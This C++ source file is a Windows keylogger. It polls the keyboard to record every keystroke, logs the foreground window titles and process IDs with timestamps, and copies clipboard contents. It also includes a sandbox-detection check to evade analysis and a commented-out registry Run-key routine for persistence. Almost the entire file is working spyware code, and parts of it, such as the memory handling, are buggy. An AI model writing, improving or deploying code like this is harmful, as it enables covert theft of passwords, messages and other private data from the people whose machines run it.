#include "KeyLogger.h"

char* last_cb_data;
WSAData _socket;
using namespace std;
/*HKEY hkey;*/
char _GRAB_WINDOW_TITLE[MaxDirPathLength],_GRAB_WINDOW_TITLE_SECONDARY[MaxDirPathLength];
const time_t hms = time(0);
clock_t Timer = clock(), Timer2;
bool gotchar=true;

FORCEINLINE int loadkeys(LPCTSTR NAME,LPCTSTR DATA)
{
  /*  RegOpenKeyExA(HKEY_CURRENT_USER,KeyBoard,0,KEY_ALL_ACCESS, &hkey);
    HKEY hkey;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE,RUN_KEY,0,KEY_ALL_ACCESS,&hkey);
    RegSetValueExA(hkey,NAME,0,REG_SZ,(LPBYTE)DATA,strlen(DATA)*sizeof(char));
    RegCloseKey(hkey);
*/
    return 0;
}
FORCEINLINE char* _USER_SHIFT_FOCUS(HWND _PROG_HNDL)
{
    int _FG_WINDOW_TITLELENGTH = GetWindowTextLengthA(_PROG_HNDL)+1;
    GetWindowTextA(_PROG_HNDL,_GRAB_WINDOW_TITLE,_FG_WINDOW_TITLELENGTH);
    char *TimeStamp=asctime(localtime(&hms));
    TimeStamp[strlen(TimeStamp)-1]=0x00;
    cout<<"\n**NEW_PROCESS**\t**PROC_HNDL**\t"<<_PROG_HNDL<<" **END_PROC_HANDLE**\t**PROC_ID** "<<GetWindowThreadProcessId(_PROG_HNDL,NULL)
    <<"** END_PROC_ID**\t **PROC_TITLE** "<<_GRAB_WINDOW_TITLE<<" **END_PROC_TITLE**\t **TIME_STAMP** "<<TimeStamp<<" **END_TIMESTAMP** "<<'\n';
    return 0 ;
}

FORCEINLINE void EnterEvent(HWND _PROG_HNDL)
{   int _FG_WINDOW_TITLELENGTH = GetWindowTextLengthA(_PROG_HNDL)+1;
    GetWindowTextA(_PROG_HNDL,_GRAB_WINDOW_TITLE_SECONDARY,_FG_WINDOW_TITLELENGTH);
    if (strcmp(_GRAB_WINDOW_TITLE,_GRAB_WINDOW_TITLE_SECONDARY))
    {
        strcpy(_GRAB_WINDOW_TITLE,_GRAB_WINDOW_TITLE_SECONDARY);
        char *TimeStamp=asctime(localtime(&hms));
        TimeStamp[strlen(TimeStamp)-1]=0x00;
        cout<<"\n**PROC_TITLE**\t"<<_GRAB_WINDOW_TITLE_SECONDARY<<"\t**END_PROC_TITLE**\t **TIME_STAMP** "<<TimeStamp<<" **END_TIMESTAMP** "<<'\n';
    }
}

FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyStrokeLogged)
{
   if (GetAsyncKeyState(VkPrimary)!=AsyncKeyStateTest_0 and GetAsyncKeyState(VkPrimary)!=AsyncKeyStateTest_1 and gotchar )
       {
           gotchar=false;
           if (LastKeyStrokeLogged!=VkPrimary)
               {
                   Timer=clock();
                   Timer2=Timer;
                   GetAsyncKeyState(VK_SHIFT)?cout<<Secondary: cout<<Primary;
                   LastKeyStrokeLogged=VkPrimary;
               }
           if((Timer-clock())/500 && ((Timer2-clock())/31))
               {
                   Timer2=clock();
                   GetAsyncKeyState(VK_SHIFT)?cout<<Secondary: cout<<Primary;
                   LastKeyStrokeLogged=VkPrimary;
               }
           }
   return LastKeyStrokeLogged;
}

FORCEINLINE int GrabFuncKey(char FunctionKey, char* StrOut,int LastKeyStrokeLogged )
{
    if (GetAsyncKeyState(FunctionKey)!=AsyncKeyStateTest_0 and GetAsyncKeyState(FunctionKey)!=AsyncKeyStateTest_1 and gotchar )
        {
            gotchar=false;
            if (LastKeyStrokeLogged!=FunctionKey)
                {
                    Timer=clock();
                    Timer2=Timer;
                    cout<<StrOut;
                    LastKeyStrokeLogged=FunctionKey;
                }
            if((Timer-clock())/500 && ((Timer2-clock())/31))
                {
                    Timer2=clock();
                    cout<<StrOut;
                    LastKeyStrokeLogged=FunctionKey;
                }
        }
    return LastKeyStrokeLogged;
}

FORCEINLINE int grabclipboard()
{
    if (OpenClipboard(NULL))
        {
            char* this_cb_data = (char*)malloc(strlen((char*)GetClipboardData(CF_TEXT)));
            strcpy(this_cb_data,(char*)GetClipboardData(CF_TEXT));
            CloseClipboard();

            if ( last_cb_data == NULL || !(strncmp(last_cb_data,this_cb_data,strlen(this_cb_data))))
            {
                if(last_cb_data == NULL)
                    last_cb_data = (char*)malloc(strlen(this_cb_data)+1);
                else
                    realloc(last_cb_data,strlen(this_cb_data));
                strncpy(last_cb_data,this_cb_data,strlen(this_cb_data));
                cout<<"\n\n **CLIPBOARD** \n"<<(char*)last_cb_data<< "\n **END_CLIPBOARD**\n\n" ;
            }
        }
    return 0;
}

int main()
{
    if(SandBoxDetection()) return SandBoxedInstance;
    if (DetectBrowserInstalation().primary);

    char WD_[MAX_PATH];
    GetModuleFileName(NULL,WD_,MAX_PATH);

    HWND CURRENTPROCEESS=GetForegroundWindow();
    _USER_SHIFT_FOCUS(CURRENTPROCEESS);
    int LastKeyStrokeLogged;
    while (1)
    {
        gotchar=true;
        if (CURRENTPROCEESS==GetForegroundWindow())
        {
            GetAsyncKeyState(VK_SHIFT);// flush buffer;
            if (GetAsyncKeyState(LastKeyStrokeLogged)== AsyncKeyStateTest_0 or GetAsyncKeyState(LastKeyStrokeLogged)==AsyncKeyStateTest_1)
                LastKeyStrokeLogged=1;
            for (int x=StartAsciiDec; x<EndAsciiDec; x++)
                LastKeyStrokeLogged=GrabKey(x,(char)x,_Char_Table[x-AsciiDecimalToBase],LastKeyStrokeLogged);

            for (int x=StartAsciiAlphebet; x<EndAsciiAlphebet;x++)
                LastKeyStrokeLogged=GetKeyState(VK_CAPITAL)?GrabKey(x,x,(x+AsciiLowerToUpper),LastKeyStrokeLogged):GrabKey(x,x+AsciiLowerToUpper,x,LastKeyStrokeLogged);

            for (int x=StartFunctionKeys; x<EndFunctionKeys; x++)
                LastKeyStrokeLogged=GrabFuncKey(MapFunctionVkeys[x].Key,MapFunctionVkeys[x].str,LastKeyStrokeLogged);

            for (int x=StartUnmapedKeys; x<EndUnmapedKeys; x++)
                LastKeyStrokeLogged=GrabKey(VkKeyScanExA(MapUnmapedVkeys[x].Primary,GetKeyboardLayout(0)),MapUnmapedVkeys[x].Primary,MapUnmapedVkeys[x].Secondary,LastKeyStrokeLogged);
        }
        else
        {
            CURRENTPROCEESS=GetForegroundWindow();
            _USER_SHIFT_FOCUS(CURRENTPROCEESS);
        }

        EnterEvent(CURRENTPROCEESS);
    }
    return 0;
}
